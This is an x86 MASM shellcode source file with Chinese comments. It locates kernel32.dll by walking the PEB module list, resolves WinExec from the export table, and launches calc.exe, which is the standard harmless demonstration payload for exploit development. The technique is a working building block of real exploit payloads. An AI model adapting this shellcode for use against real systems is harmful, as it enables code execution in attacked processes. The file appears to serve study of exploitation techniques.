		.386
		.model flat,stdcall
		option casemap:none
;==========================================================;
;
;				通用型calc-Shellcode			 
;
;==========================================================;

		.code
	
start:
 
		pushad
		
		xor eax,eax
		;calc
		push eax
		push 'clac'
		;WinExec
		push eax
		push '?cex'
		mov BYTE ptr[esp+3],al	
		push 'EniW'
		;kernel32
		push eax
		push '23le'
		push 'nrek'
		
		assume fs:nothing
	   mov edx,fs:[eax+30h] 		;PEB
	   mov edx,[edx+0ch] 			;PEB_LDR_DATA
	   add edx,1ch 					;InInitializationOrderModuleList-->LDR_MODULE
	   mov eax,edx						;将双向链表头指针保存,用来结束循环
	   
NextModule:
		xor ecx,ecx
		mov edx,[edx+ecx]				;循环遍历所有节点
		cmp eax,edx						;判断当前的节点指针是否与双向链表头指针相等，相等的话就表示没找到
		je	 GoRet						;循环遍历双向链表都没找到，结束
		
		;xor ecx,ecx							
		mov esi,[edx+20h]   			;获取UNICODE_STRING结构的PWSTR 字符串
		mov edi,esp						;堆栈中Kernel32的字符串
		mov cl,8							;堆栈中Kernel32的字符串长度
		
STRCMP:		

		mov al,[esi+ecx*2-2]			;从字符串末端开始比较
		mov bl,[edi+ecx-1]			
		dec cl
		cmp al,bl						;比较是否等于kernel32.dll的unicode串
		je STRCMP
		cmp cl,0FFh						;cl=-1时表示匹配成功						
		jne NextModule	


		;eax -->  IMAGE_DOS_HEADERS
 		mov eax,[edx+8] 				;eax --> LDR_MODULE结构基地址baseAddress,即kernel32.dll的模块基址				
 		mov edx,[edx+8]
		;eax -->  IMAGE_NT_HEADERS		
		add eax,[eax+3Ch]
		;eax -->  IMAGE_EXPORT_DIRECTORY									
		mov eax,[eax+78h]				;OptionalHeader.DataDirectory.VirtualAddress
		add eax,edx
		mov ebx,[eax+20h]				;AddressOfNames
		adc ebx,edx						;ebx指向函数名字符串
		mov ecx,[eax+18h]				;NumberOfNames

NextFuncName:
		mov edi,[ebx]
		add edi,edx
		lea esi,[esp+0ch]				;堆栈中的 'WinExec'
		push ecx
		mov cl,8							;WinExec的字符串长度，包括结尾的0
		repz cmpsb						;比较ES:[ESI]和ES:[EDI]的每一个字符
		test cl,cl
		pop ecx
		jz GetFuncAddr					;找到WinExec字符串
		add ebx,4						;每一项RVA占4字节
		loop NextFuncName
		jmp GoRet
		
		
GetFuncAddr:
		sub ebx,edx
		sub ebx,[eax+20h]				;AddressOfNames
		shr ebx,1
		add ebx,[eax+24h]				;AddressOfNameOrdinals
		add ebx,edx
		movzx ecx,WORD ptr [ebx]	;2字节的导出函数序号
		shl ecx,2
		add ecx,[eax+1ch]				;AddressOfFunctions
		add ecx,edx
		mov ecx,[ecx]					;函数RVA	
		add ecx,edx						;函数VA

		;调用WinExec
		lea ebx,[esp+18h]				;堆栈中的 	'calc',0
		push 1							;SW_NORMAL	equ 1
		push ebx
		call ecx	

		
GoRet:
		add esp,20h
		popad
		ret
		
		end start